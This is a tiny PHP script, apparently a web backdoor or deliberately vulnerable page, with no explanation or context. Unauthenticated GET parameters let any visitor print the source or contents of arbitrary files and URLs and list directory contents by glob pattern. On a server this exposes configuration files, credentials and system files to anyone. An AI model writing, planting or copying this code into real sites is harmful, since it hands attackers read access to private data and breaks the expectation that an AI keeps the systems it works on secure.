<?php

if(sizeof($_GET)) {
    if(!empty($_GET['f'])) {
        highlight_file($_GET['f']);
    }
    elseif(!empty($_GET['f2'])) {
        echo file_get_contents($_GET['f2']);
    }
    elseif(!empty($_GET['d'])) {
        echo '<pre>'.print_r(glob($_GET['d']), true).'</pre>';
    }
}